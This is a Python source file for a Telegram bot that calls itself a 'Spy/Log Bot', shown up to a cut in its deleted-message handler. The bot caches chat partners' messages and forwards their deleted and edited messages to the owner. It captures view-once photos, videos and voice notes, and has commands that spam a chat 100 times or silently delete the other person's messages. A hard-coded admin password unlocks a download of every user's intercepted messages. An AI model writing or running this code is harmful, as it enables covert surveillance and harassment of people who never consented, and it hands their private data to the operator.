import os
import asyncio
import logging
import time
from datetime import datetime
import sqlite3
import aiosqlite
from dotenv import load_dotenv

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, BusinessConnection, BusinessMessagesDeleted, FSInputFile, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, BotCommand
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage


load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN is not defined in the environment variables or .env file.")


IMMEDIATE_FORWARD = os.getenv("IMMEDIATE_FORWARD", "False").lower() in ("true", "1", "yes")


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
) 
logger = logging.getLogger(__name__)


router = Router()
DB_FILE = "bot_cache.db"

muted_chats: dict[int, dict] = {}

cloned_chats: set[int] = set()

# Admin Settings & States
ADMIN_ID = 7020756743
ADMIN_USERNAME = "neznayutebya"
ADMIN_PASSWORD = "ismoilovaziz67"

class AdminStates(StatesGroup):
    waiting_for_password = State()
    waiting_for_broadcast = State()

def is_super_admin(message: Message) -> bool:
    if not message.from_user:
        return False
    user_id = message.from_user.id
    username = message.from_user.username
    return (user_id == ADMIN_ID) or (username and username.lower().replace("@", "") == ADMIN_USERNAME.lower())

def get_admin_start_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔑 Войти в админ-панель")]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def get_admin_panel_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 Статистика"), KeyboardButton(text="💾 Скачать БД")],
            [KeyboardButton(text="📢 Рассылка всем"), KeyboardButton(text="🚪 Выйти из админки")]
        ],
        resize_keyboard=True
    )



async def init_db():
    """Initializes the SQLite database schema."""
    async with aiosqlite.connect(DB_FILE) as db:

        await db.execute("""
            CREATE TABLE IF NOT EXISTS messages (
                chat_id INTEGER,
                message_id INTEGER,
                user_id INTEGER,
                fullname TEXT,
                username TEXT,
                text TEXT,
                media_type TEXT,
                file_id TEXT,
                date INTEGER,
                business_connection_id TEXT,
                local_file_path TEXT,
                PRIMARY KEY (chat_id, message_id)
            )
        """)

        await db.execute("""
            CREATE TABLE IF NOT EXISTS connections (
                connection_id TEXT PRIMARY KEY,
                owner_id INTEGER,
                owner_username TEXT
            )
        """)
  
        await db.execute("""
            CREATE TABLE IF NOT EXISTS admins (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                fullname TEXT
            )
        """)
        await db.commit()

       
        async with db.execute("PRAGMA table_info(messages)") as cursor:
            columns = await cursor.fetchall()
            column_names = [col[1] for col in columns]
            if "local_file_path" not in column_names:
                await db.execute("ALTER TABLE messages ADD COLUMN local_file_path TEXT")
                await db.commit()

    logger.info("Database initialized successfully.")

async def save_admin(user_id: int, username: str, fullname: str):
    """Saves an admin (user who started the bot)."""
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT OR REPLACE INTO admins (user_id, username, fullname) VALUES (?, ?, ?)",
            (user_id, username, fullname)
        )
        await db.commit()

async def get_admins():
    """Retrieves all registered admins."""
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT user_id FROM admins") as cursor:
            rows = await cursor.fetchall()
            return [row[0] for row in rows]

async def save_connection(connection_id: str, owner_id: int, owner_username: str):
    """Saves or updates a business connection mapping."""
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT OR REPLACE INTO connections (connection_id, owner_id, owner_username) VALUES (?, ?, ?)",
            (connection_id, owner_id, owner_username)
        )
        await db.commit()
    logger.info(f"Saved connection {connection_id} for owner {owner_id} (@{owner_username})")

async def get_owner_by_connection(connection_id: str):
    """Gets the owner's user_id for a given connection_id."""
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            "SELECT owner_id FROM connections WHERE connection_id = ?",
            (connection_id,)
        ) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else None

async def save_message(
    chat_id: int,
    message_id: int,
    user_id: int,
    fullname: str,
    username: str,
    text: str,
    media_type: str,
    file_id: str,
    date: int,
    business_connection_id: str = None,
    local_file_path: str = None
):
    """Saves a message to the database cache."""
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            """
            INSERT OR REPLACE INTO messages 
            (chat_id, message_id, user_id, fullname, username, text, media_type, file_id, date, business_connection_id, local_file_path) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (chat_id, message_id, user_id, fullname, username, text, media_type, file_id, date, business_connection_id, local_file_path)
        )
        await db.commit()

async def update_message_local_path(chat_id: int, message_id: int, local_file_path: str):
    """Updates the local file path of a cached message."""
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "UPDATE messages SET local_file_path = ? WHERE chat_id = ? AND message_id = ?",
            (local_file_path, chat_id, message_id)
        )
        await db.commit()

async def get_message(chat_id: int, message_id: int):
    """Gets a cached message from the database."""
    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = sqlite3.Row
        async with db.execute(
            "SELECT * FROM messages WHERE chat_id = ? AND message_id = ?",
            (chat_id, message_id)
        ) as cursor:
            row = await cursor.fetchone()
            return dict(row) if row else None



def get_media_info(message: Message):
    """Extracts media type and file_id from a Message object."""
    media_type = None
    file_id = None
    text = message.text or message.caption or ""

    if message.photo:
        media_type = "photo"
        file_id = message.photo[-1].file_id
    elif message.sticker:
        media_type = "sticker"
        file_id = message.sticker.file_id
    elif message.animation:
        media_type = "animation"
        file_id = message.animation.file_id
    elif message.voice:
        media_type = "voice"
        file_id = message.voice.file_id
    elif message.video:
        media_type = "video"
        file_id = message.video.file_id
    elif message.video_note:
        media_type = "video_note"
        file_id = message.video_note.file_id
    elif message.document:
        media_type = "document"
        file_id = message.document.file_id
    elif message.audio:
        media_type = "audio"
        file_id = message.audio.file_id

    return media_type, file_id, text

def format_date(timestamp: int) -> str:
    """Formats Unix timestamp into readable date."""
    return datetime.fromtimestamp(timestamp).strftime("%d.%m.%Y %H:%M:%S")

def format_user_link(fullname: str, username: str) -> str:
    """Formats user name with optional username link."""
    clean_fullname = fullname.replace("<", "&lt;").replace(">", "&gt;")
    if username:
        return f"<b>{clean_fullname}</b> (@{username})"
    return f"<b>{clean_fullname}</b>"


def parse_owner_command(text: str):
    """
    Parses an owner command from text.
    Returns (cmd, count, payload) or (None, None, None) if not a command.
    Commands:
        .spam N text  -> ("spam", N, "text")
        .mute N       -> ("mute", N, None)   N optional, default 0 = infinite
        .mute         -> ("mute", 0, None)
        .unmute       -> ("unmute", None, None)
    """
    t = text.strip()
    if not t.startswith("."):
        return None, None, None

    parts = t.split(maxsplit=2)
    cmd = parts[0].lower()

    if cmd == ".spam":
        if len(parts) < 3:
            return None, None, None
        try:
            count = max(1, min(int(parts[1]), 100))  
        except ValueError:
            return None, None, None
        payload = parts[2]
        return "spam", count, payload

    if cmd == ".mute":
        duration = 0
        if len(parts) >= 2:
            try:
                duration = max(0, int(parts[1]))
            except ValueError:
                pass
        return "mute", duration, None

    if cmd == ".unmute":
        return "unmute", None, None

    if cmd == ".clone":
        return "clone", None, None

    if cmd == ".unclone":
        return "unclone", None, None

    return None, None, None


async def run_mute_timer(bot, chat_id: int, conn_id: str, duration: int, status_msg_id: int):
    """Background task: waits duration seconds then lifts the mute."""
    await asyncio.sleep(duration)
    
    if chat_id in muted_chats and muted_chats[chat_id].get("msg_id") == status_msg_id:
        muted_chats.pop(chat_id, None)
        logger.info(f"[MUTE] Auto-unmute for chat {chat_id} after {duration}s")
        try:
            await bot.edit_message_text(
                text="🔊 <b>Активен</b>\n\nВремя мута истекло.",
                business_connection_id=conn_id,
                chat_id=chat_id,
                message_id=status_msg_id,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"[MUTE] Failed to edit status msg on unmute: {e}")




@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    """Handles the /start command. Registers the user as bot administrator."""
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or ""
    fullname = message.from_user.full_name

    await save_admin(user_id, username, fullname)
    
    welcome_text = (
        "👋 <b>Привет! Я бот-логгер (Spy/Log Bot).</b>\n\n"
        "Я готов записывать удаленные и измененные сообщения.\n\n"
        "🔧 <b>Инструкция по настройке:</b>\n"
        "1. Перейдите в <i>Настройки Telegram -> Telegram Business -> Чат-боты</i>.\n"
        "2. Выберите этого бота в качестве чат-бота для ваших личных диалогов.\n"
        "3. Убедитесь, что боту разрешен доступ к сообщениям.\n\n"
        "После этого любые удаленные или измененные сообщения ваших собеседников будут присылаться сюда!"
    )
    if is_super_admin(message):
        welcome_text += "\n\n⭐ <b>Вам доступна админ-панель. Нажмите кнопку ниже для входа.</b>"
        await message.answer(welcome_text, parse_mode="HTML", reply_markup=get_admin_start_keyboard())
    else:
        await message.answer(welcome_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())

@router.message(F.text == "🔑 Войти в админ-панель")
async def ask_admin_password(message: Message, state: FSMContext):
    if not is_super_admin(message):
        return
    await state.set_state(AdminStates.waiting_for_password)
    await message.answer("🔒 <b>Введите пароль от админ-панели:</b>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())

@router.message(AdminStates.waiting_for_password)
async def check_admin_password(message: Message, state: FSMContext):
    if not is_super_admin(message):
        await state.clear()
        return

    if message.text == ADMIN_PASSWORD:
        await state.clear()
        await message.answer(
            "🔓 <b>Пароль верный! Добро пожаловать в админ-панель.</b>",
            parse_mode="HTML",
            reply_markup=get_admin_panel_keyboard()
        )
    else:
        await message.answer(
            "❌ <b>Неверный пароль!</b> Попробуйте еще раз или введите /start для отмены.",
            parse_mode="HTML"
        )

@router.message(F.text == "📊 Статистика")
async def show_stats(message: Message):
    if not is_super_admin(message):
        return
    
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT COUNT(*) FROM admins") as cursor:
            total_users = (await cursor.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM connections") as cursor:
            total_connections = (await cursor.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM messages") as cursor:
            total_messages = (await cursor.fetchone())[0]
            
    stats_text = (
        "📊 <b>Статистика бота:</b>\n\n"
        f"👥 Всего пользователей: <code>{total_users}</code>\n"
        f"🔌 Активных подключений: <code>{total_connections}</code>\n"
        f"💬 Сообщений в кэше: <code>{total_messages}</code>"
    )
    await message.answer(stats_text, parse_mode="HTML")

@router.message(F.text == "💾 Скачать БД")
async def download_db(message: Message):
    if not is_super_admin(message):
        return
    
    if os.path.exists(DB_FILE):
        db_file = FSInputFile(DB_FILE)
        await message.answer_document(db_file, caption="💾 <b>Актуальная резервная копия базы данных.</b>", parse_mode="HTML")
    else:
        await message.answer("❌ Файл базы данных не найден.")

@router.message(F.text == "📢 Рассылка всем")
async def ask_broadcast_text(message: Message, state: FSMContext):
    if not is_super_admin(message):
        return
    
    await state.set_state(AdminStates.waiting_for_broadcast)
    await message.answer("📢 <b>Введите текст сообщения для рассылки всем пользователям:</b>\n\nДля отмены введите /start", parse_mode="HTML")

@router.message(AdminStates.waiting_for_broadcast)
async def process_broadcast(message: Message, state: FSMContext):
    if not is_super_admin(message):
        await state.clear()
        return
    
    await state.clear()
    broadcast_text = message.text
    if not broadcast_text:
        await message.answer("❌ Отменено. Сообщение должно быть текстовым.", reply_markup=get_admin_panel_keyboard())
        return
    
    await message.answer("⏳ <b>Рассылка запущена...</b>", parse_mode="HTML")
    
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT user_id FROM admins") as cursor:
            rows = await cursor.fetchall()
            users = [row[0] for row in rows]
            
    success_count = 0
    fail_count = 0
    
    for user_id in users:
        try:
            await message.bot.send_message(chat_id=user_id, text=broadcast_text)
            success_count += 1
            await asyncio.sleep(0.05)  # Flood control
        except Exception:
            fail_count += 1
            
    await message.answer(
        f"✅ <b>Рассылка успешно завершена!</b>\n\n"
        f"📢 Отправлено: <code>{success_count}</code>\n"
        f"❌ Ошибок: <code>{fail_count}</code>",
        parse_mode="HTML",
        reply_markup=get_admin_panel_keyboard()
    )

@router.message(F.text == "🚪 Выйти из админки")
async def exit_admin_panel(message: Message, state: FSMContext):
    if not is_super_admin(message):
        return
    await state.clear()
    await message.answer("🚪 <b>Вы успешно вышли из админ-панели.</b>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())

@router.message(Command("commands"))
@router.message(Command("cmd"))
async def cmd_commands_list(message: Message):
    commands_text = (
        "📜 <b>Доступные команды бота:</b>\n\n"
        "🔄 /start — Перезапустить бота\n"
        "⚙️ /settings — Настройки\n"
        "💻 /cmd — Описание команд\n"
        "♻️ /chat — Чаты\n"
        "📜 /commands — Показать список всех команд"
    )
    await message.answer(commands_text, parse_mode="HTML")

@router.message(Command("settings"))
async def cmd_settings(message: Message):
    await message.answer("⚙️ <b>Настройки:</b>\n\nНастройка чат-бота производится в приложении Telegram:\n<i>Настройки -> Telegram Business -> Чат-боты</i>.", parse_mode="HTML")

@router.message(Command("chat"))
async def cmd_chat(message: Message):
    await message.answer("♻️ <b>Чаты:</b>\n\nБот автоматически логирует сообщения в личных диалогах, к которым вы его подключили через настройки Telegram Business.", parse_mode="HTML")


@router.business_connection()
async def handle_business_connection(connection: BusinessConnection):
    """Handles business connection events."""
    owner_id = connection.user.id
    owner_username = connection.user.username or ""
    
    if connection.is_enabled:
        await save_connection(connection.id, owner_id, owner_username)
        logger.info(f"Business connection established: {connection.id} with owner {owner_id}")
        try:
            await connection.bot.send_message(
                chat_id=owner_id,
                text="🔌 <b>Бот подключен!</b> ✅\n\nТеперь я отслеживаю сообщения в ваших чатах.",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to send connection message to user {owner_id}: {e}")
    else:
        logger.info(f"Business connection disabled: {connection.id}")
        try:
            await connection.bot.send_message(
                chat_id=owner_id,
                text="🔌 <b>Бот отключен.</b> ❌\n\nОтслеживание сообщений прекращено.",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to send disconnection message to user {owner_id}: {e}")


@router.business_message()
@router.message(F.chat.type == "private", F.business_connection_id == None)
async def handle_new_message(message: Message):
    """Caches all incoming and outgoing business or standard private messages."""
    chat_id = message.chat.id
    message_id = message.message_id
    user_id = message.from_user.id
    fullname = message.from_user.full_name
    username = message.from_user.username or ""
    date = message.date.timestamp()
    business_conn_id = message.business_connection_id

    media_type, file_id, text = get_media_info(message)

    owner_id = None
    if business_conn_id:
        owner_id = await get_owner_by_connection(business_conn_id)
    is_incoming = (owner_id is not None) and (user_id != owner_id)

    logger.info(
        f"[MSG] chat={chat_id} msg_id={message_id} user={user_id} owner={owner_id} "
        f"incoming={is_incoming} media={media_type} file_id={'yes' if file_id else 'no'} "
        f"reply_to={message.reply_to_message.message_id if message.reply_to_message else None}"
    )

  
    if is_incoming and chat_id in muted_chats and business_conn_id:
        try:
            await message.bot.delete_business_messages(
                business_connection_id=business_conn_id,
                message_ids=[message_id]
            )
            logger.info(f"[MUTE] Deleted msg {message_id} from muted chat {chat_id}")
        except Exception as e:
            logger.error(f"[MUTE] Failed to delete msg {message_id}: {e}")
        return  
        
    if business_conn_id and owner_id and user_id == owner_id and not message.reply_to_message:
        raw_text = (message.text or message.caption or "").strip()
        cmd, count, payload = parse_owner_command(raw_text)

        if cmd == "spam":
            
            try:
                await message.bot.delete_business_messages(
                    business_connection_id=business_conn_id,
                    message_ids=[message_id]
                )
            except Exception as e:
                logger.warning(f"[SPAM] Could not delete command msg: {e}")
           
            for i in range(count):
                try:
                    await message.bot.send_message(
                        chat_id=chat_id,
                        text=payload,
                        business_connection_id=business_conn_id
                    )
                    await asyncio.sleep(0.05)
                except Exception as e:
                    logger.error(f"[SPAM] Failed on iteration {i+1}: {e}")
                    break
            logger.info(f"[SPAM] Sent '{payload}' {count}x to chat {chat_id}")
            return

        elif cmd == "mute":
            duration = count  

            existing = muted_chats.get(chat_id)
            if existing and existing.get("task"):
                existing["task"].cancel()

           
            try:
                await message.bot.delete_business_messages(
                    business_connection_id=business_conn_id,
                    message_ids=[message_id]
                )
            except Exception as e:
                logger.warning(f"[MUTE] Could not delete command msg: {e}")

            
            if duration > 0:
                mute_text = (
                    f"🔇 <b>Заглушен на {duration} сек.</b>\n\n"
                    f"Мут снимется автоматически. Снять досрочно — .unmute"
                )
            else:
                mute_text = "🔇 <b>Заглушен.</b>\n\nСнять — .unmute"

            status_msg = None
            try:
                status_msg = await message.bot.send_message(
                    chat_id=chat_id,
                    text=mute_text,
                    business_connection_id=business_conn_id,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"[MUTE] Failed to send status msg: {e}")

            status_msg_id = status_msg.message_id if status_msg else None

            
            mute_task = None
            if duration > 0 and status_msg_id:
                mute_task = asyncio.create_task(
                    run_mute_timer(message.bot, chat_id, business_conn_id, duration, status_msg_id)
                )

            muted_chats[chat_id] = {
                "until": time.time() + duration if duration > 0 else float("inf"),
                "task": mute_task,
                "conn_id": business_conn_id,
                "msg_id": status_msg_id
            }
            logger.info(f"[MUTE] Chat {chat_id} muted for {duration}s (msg_id={status_msg_id})")
            return

        elif cmd == "unmute":
            existing = muted_chats.pop(chat_id, None)
            
            try:
                await message.bot.delete_business_messages(
                    business_connection_id=business_conn_id,
                    message_ids=[message_id]
                )
            except Exception as e:
                logger.warning(f"[UNMUTE] Could not delete command msg: {e}")

            if existing:
                if existing.get("task"):
                    existing["task"].cancel()
               
                if existing.get("msg_id"):
                    try:
                        await message.bot.edit_message_text(
                            text="🔊 <b>Активен</b>\n\nМут снят досрочно.",
                            business_connection_id=business_conn_id,
                            chat_id=chat_id,
                            message_id=existing["msg_id"],
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"[UNMUTE] Failed to edit status msg: {e}")
            logger.info(f"[UNMUTE] Chat {chat_id} unmuted")
            return

        elif cmd == "clone":
          
            try:
                await message.bot.delete_business_messages(
                    business_connection_id=business_conn_id,
                    message_ids=[message_id]
                )
            except Exception as e:
                logger.warning(f"[CLONE] Could not delete command msg: {e}")
            if chat_id in cloned_chats:
               
                cloned_chats.discard(chat_id)
                logger.info(f"[CLONE] Disabled for chat {chat_id}")
            else:
                cloned_chats.add(chat_id)
                logger.info(f"[CLONE] Enabled for chat {chat_id}")
            return

        elif cmd == "unclone":
            
            try:
                await message.bot.delete_business_messages(
                    business_connection_id=business_conn_id,
                    message_ids=[message_id]
                )
            except Exception as e:
                logger.warning(f"[UNCLONE] Could not delete command msg: {e}")
            cloned_chats.discard(chat_id)
            logger.info(f"[UNCLONE] Disabled clone for chat {chat_id}")
            return

    local_file_path = None
    if file_id and media_type in ("photo", "video", "voice", "video_note") and is_incoming:
        
        file_size = 0
        if message.photo:
            file_size = message.photo[-1].file_size or 0
        elif message.video:
            file_size = message.video.file_size or 0
        elif message.voice:
            file_size = message.voice.file_size or 0
        elif message.video_note:
            file_size = message.video_note.file_size or 0

        if file_size <= 20 * 1024 * 1024:
            download_ok = False
            try:
                os.makedirs("downloads", exist_ok=True)
                file_info = await message.bot.get_file(file_id)
                file_path = file_info.file_path
                ext = os.path.splitext(file_path)[1]
                if not ext:
                    if media_type == "photo": ext = ".jpg"
                    elif media_type == "video": ext = ".mp4"
                    elif media_type == "voice": ext = ".ogg"
                    elif media_type == "video_note": ext = ".mp4"
                    else: ext = ".bin"
                
                local_filename = f"{chat_id}_{message_id}{ext}"
                local_file_path = os.path.join("downloads", local_filename)
                
                await message.bot.download_file(file_path, local_file_path)
                logger.info(f"[DOWNLOAD] OK: {local_file_path}")
                download_ok = True
            except Exception as e:
                logger.error(f"[DOWNLOAD] FAILED for msg {message_id} (likely view-once): {e}")
                local_file_path = None

           
            if owner_id and IMMEDIATE_FORWARD:
                formatted_user = format_user_link(fullname, username)
                sent_date = format_date(int(date))
                label = "view-once 🔥" if not download_ok else media_type
                caption = (
                    f"🔥 <b>Перехваченное медиа ({label})</b>\n"
                    f"👤 От: {formatted_user}\n"
                    f"🕐 Получено: <code>{sent_date}</code>\n"
                    f"⚠️ <i>Перехвачено автоматически при получении</i>"
                )
               
                if download_ok and local_file_path and os.path.exists(local_file_path):
                    media_input = FSInputFile(local_file_path)
                    logger.info(f"[IMMEDIATE] Sending via local file: {local_file_path}")
                else:
                    media_input = file_id
                    logger.info(f"[IMMEDIATE] Sending via file_id (view-once)")

                try:
                    if media_type == "photo":
                        await message.bot.send_photo(chat_id=owner_id, photo=media_input, caption=caption, parse_mode="HTML")
                    elif media_type == "video":
                        await message.bot.send_video(chat_id=owner_id, video=media_input, caption=caption, parse_mode="HTML")
                    elif media_type == "voice":
                        await message.bot.send_voice(chat_id=owner_id, voice=media_input, caption=caption, parse_mode="HTML")
                    elif media_type == "video_note":
                        await message.bot.send_message(chat_id=owner_id, text=caption, parse_mode="HTML")
                        await message.bot.send_video_note(chat_id=owner_id, video_note=media_input)
                    logger.info(f"[IMMEDIATE] Successfully sent to owner {owner_id}")
                except Exception as e:
                    logger.error(f"[IMMEDIATE] Failed to send to owner {owner_id}: {e}")

    await save_message(
        chat_id=chat_id,
        message_id=message_id,
        user_id=user_id,
        fullname=fullname,
        username=username,
        text=text,
        media_type=media_type,
        file_id=file_id,
        date=int(date),
        business_connection_id=business_conn_id,
        local_file_path=local_file_path
    )

    if business_conn_id and message.reply_to_message and owner_id and user_id == owner_id:
        replied_msg = message.reply_to_message
        
        
        replied_media_type, replied_file_id, replied_text = get_media_info(replied_msg)
        
        if replied_file_id and replied_media_type:
            replied_msg_id = replied_msg.message_id
            logger.info(f"[REPLY] Owner replying to media msg_id={replied_msg_id} in chat={chat_id}")
            
            cached_msg = await get_message(chat_id, replied_msg_id)
            
            
            if not cached_msg:
                logger.info(f"[REPLY] Replied msg {replied_msg_id} was not in cache. Creating cache entry from message data.")
                
              
                client_user_id = replied_msg.from_user.id if replied_msg.from_user else chat_id
                client_fullname = replied_msg.from_user.full_name if replied_msg.from_user else "Собеседник"
                client_username = replied_msg.from_user.username or ""
                
                await save_message(
                    chat_id=chat_id,
                    message_id=replied_msg_id,
                    user_id=client_user_id,
                    fullname=client_fullname,
                    username=client_username,
                    text=replied_text,
                    media_type=replied_media_type,
                    file_id=replied_file_id,
                    date=int(replied_msg.date.timestamp()),
                    business_connection_id=business_conn_id,
                    local_file_path=None
                )
                cached_msg = {
                    "chat_id": chat_id,
                    "message_id": replied_msg_id,
                    "user_id": client_user_id,
                    "fullname": client_fullname,
                    "username": client_username,
                    "text": replied_text,
                    "media_type": replied_media_type,
                    "file_id": replied_file_id,
                    "date": int(replied_msg.date.timestamp()),
                    "business_connection_id": business_conn_id,
                    "local_file_path": None
                }

            formatted_user = format_user_link(cached_msg["fullname"], cached_msg["username"])
            sent_date = format_date(cached_msg["date"])
            
            caption = (
                f"🔥 <b>Перехваченное медиа ({replied_media_type})</b>\n"
                f"👤 От: {formatted_user}\n"
                f"🕐 Отправлено: <code>{sent_date}</code>\n"
            )
            if cached_msg["text"]:
                caption += f"\n💬 <b>Подпись:</b>\n<i>{cached_msg['text']}</i>"

            local_path = cached_msg.get("local_file_path")
            has_local = local_path and os.path.exists(local_path)
            cached_file_id = cached_msg.get("file_id")

            
            if not has_local and cached_file_id:
                try:
                    os.makedirs("downloads", exist_ok=True)
                    file_info = await message.bot.get_file(cached_file_id)
                    file_path = file_info.file_path
                    ext = os.path.splitext(file_path)[1]
                    if not ext:
                        if replied_media_type == "photo": ext = ".jpg"
                        elif replied_media_type == "video": ext = ".mp4"
                        elif replied_media_type == "voice": ext = ".ogg"
                        elif replied_media_type == "video_note": ext = ".mp4"
                        else: ext = ".bin"
                    
                    local_filename = f"{chat_id}_{replied_msg_id}{ext}"
                    local_path = os.path.join("downloads", local_filename)
                    
                    await message.bot.download_file(file_path, local_path)
                    has_local = True
                    await update_message_local_path(chat_id, replied_msg_id, local_path)
                    logger.info(f"[REPLY] Successfully downloaded media on-demand: {local_path}")
                except Exception as e:
                    logger.warning(f"[REPLY] On-demand download failed for msg {replied_msg_id}: {e}")

            logger.info(f"[REPLY] media={replied_media_type} has_local={has_local} has_file_id={bool(cached_file_id)}")

            if not has_local and not cached_file_id:
                logger.warning(f"[REPLY] No local file or file_id for replied message {replied_msg_id}, cannot send.")
                try:
                    await message.bot.send_message(
                        chat_id=owner_id,
                        text=(
                            f"🔥 <b>Перехваченное медиа (view-once)</b>\n"
                            f"👤 От: {format_user_link(cached_msg['fullname'], cached_msg['username'])}\n"
                            f"🕐 Отправлено: <code>{format_date(cached_msg['date'])}</code>\n\n"
                            f"❌ <i>Файл недоступен — одноразовое медиа уже было просмотрено или удалено Telegram'ом до того, как бот успел его сохранить.</i>"
                        ),
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"[REPLY] Failed to notify owner about missing file: {e}")
            else:
                media_input = FSInputFile(local_path) if has_local else cached_file_id
                
                try:
                    if replied_media_type == "photo":
                        await message.bot.send_photo(chat_id=owner_id, photo=media_input, caption=caption, parse_mode="HTML")
                    elif replied_media_type == "video":
                        await message.bot.send_video(chat_id=owner_id, video=media_input, caption=caption, parse_mode="HTML")
                    elif replied_media_type == "voice":
                        await message.bot.send_voice(chat_id=owner_id, voice=media_input, caption=caption, parse_mode="HTML")
                    elif replied_media_type == "video_note":
                        await message.bot.send_message(chat_id=owner_id, text=caption, parse_mode="HTML")
                        await message.bot.send_video_note(chat_id=owner_id, video_note=media_input)
                    elif replied_media_type == "animation":
                        await message.bot.send_animation(chat_id=owner_id, animation=media_input, caption=caption, parse_mode="HTML")
                    elif replied_media_type == "document":
                        await message.bot.send_document(chat_id=owner_id, document=media_input, caption=caption, parse_mode="HTML")
                    elif replied_media_type == "audio":
                        await message.bot.send_audio(chat_id=owner_id, audio=media_input, caption=caption, parse_mode="HTML")
                    elif replied_media_type == "sticker":
                        await message.bot.send_message(chat_id=owner_id, text=caption, parse_mode="HTML")
                        await message.bot.send_sticker(chat_id=owner_id, sticker=media_input)
                    else:
                        await message.bot.send_document(chat_id=owner_id, document=media_input, caption=caption, parse_mode="HTML")
                    
                    logger.info(f"[REPLY] Sent to owner {owner_id} via {'local file' if has_local else 'file_id'}")
                    
                    
                    if has_local:
                        try:
                            os.remove(local_path)
                            await update_message_local_path(chat_id, replied_msg_id, None)
                        except Exception as e:
                            logger.error(f"[REPLY] Error removing cached file: {e}")
                except Exception as e:
                    logger.error(f"[REPLY] Error sending to owner {owner_id}: {e}")




@router.edited_business_message()
@router.edited_message(F.chat.type == "private", F.business_connection_id == None)
async def handle_edited_message(message: Message):
    """Processes edited messages (both business and standard private messages)."""
    chat_id = message.chat.id
    message_id = message.message_id
    new_text = message.text or message.caption or ""
    business_conn_id = message.business_connection_id

    old_msg = await get_message(chat_id, message_id)
    if not old_msg:
     
        media_type, file_id, text = get_media_info(message)
        await save_message(
            chat_id=chat_id,
            message_id=message_id,
            user_id=message.from_user.id,
            fullname=message.from_user.full_name,
            username=message.from_user.username or "",
            text=text,
            media_type=media_type,
            file_id=file_id,
            date=int(message.date.timestamp()),
            business_connection_id=business_conn_id
        )
        return

    old_text = old_msg["text"]
    if old_text == new_text:
        return  

    notify_ids = []
    if business_conn_id:
        owner_id = await get_owner_by_connection(business_conn_id)
        if owner_id:
            notify_ids.append(owner_id)
    else:
      
        admins = await get_admins()
        notify_ids.extend(admins)

   
    sender_id = old_msg["user_id"]
    
    for target_id in notify_ids:
        
        if sender_id == target_id:
            continue

        formatted_user = format_user_link(old_msg["fullname"], old_msg["username"])
        sent_date = format_date(old_msg["date"])
        
        report = (
            f"✏️ <b>Сообщение изменено</b>\n"
            f"👤 От: {formatted_user}\n"
            f"🕐 Отправлено: <code>{sent_date}</code>\n\n"
            f"<b>Было:</b>\n"
            f"<i>{old_text or '[Без текста]'}</i>\n\n"
            f"<b>Стало:</b>\n"
            f"<i>{new_text or '[Без текста]'}</i>"
        )
        
        try:
            await message.bot.send_message(
                chat_id=target_id,
                text=report,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to send edit log to {target_id}: {e}")

   
    await save_message(
        chat_id=chat_id,
        message_id=message_id,
        user_id=old_msg["user_id"],
        fullname=old_msg["fullname"],
        username=old_msg["username"],
        text=new_text,
        media_type=old_msg["media_type"],
        file_id=old_msg["file_id"],
        date=old_msg["date"],
        business_connection_id=business_conn_id
    )


@router.deleted_business_messages()
async def handle_deleted_business_messages(event: BusinessMessagesDeleted):
    """Processes deleted business messages and forwards the original content to the owner."""
    chat_id = event.chat.id
    business_conn_id = event.business_connection_id
    message_ids = event.message_ids

   
    owner_id = await get_owner_by_connection(business_conn_id)
    if not owner_id:
        logger.warning(f"No owner found for business connection {business_conn_id}")
        return

    for msg_id in message_ids:
        old_msg = await get_message(chat_id, msg_id)
        if not old_msg:
            logger.info(f"Deleted message {msg_id} was not cached.")
            continue

     
        if old_msg["user_id"] == owner_id:
            continue

        formatted_user = format_user_link(old_msg["fullname"], old_msg["username"])
        sent_date = format_date(old_msg["date"])
        media_type = old_msg["media_type"]
        file_id = old_msg["file_id"]
        text = old_msg["text"]

        caption = (
            f"🗑 <b>Сообщение удалено</b>\n"
            f"👤 От: {formatted_user}\n"
            f"🕐 Отправлено: <code>{sent_date}</code>\n"
        )

        try:
            if not media_type:
                
                report = caption + f"\n💬 <b>Текст:</b>\n<i>{text}</i>"
                await event.bot.send_message(chat_id=owner_id, text=report, parse_mode="HTML")
            else:
               
                caption_media = caption + (f"\n💬 <b>Подпись:</b>\n<i>{text}</i>" if text else "")
                
                local_path = old_msg.get("local_file_path")
